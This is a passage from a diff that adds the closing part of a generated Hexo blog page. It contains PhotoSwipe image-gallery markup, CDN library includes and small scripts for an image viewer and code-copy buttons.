+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+<!-- ClickLove -->
+ 
+<script src="/js/clickLove.js"></script>
+ 
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</body>
+
+</html>
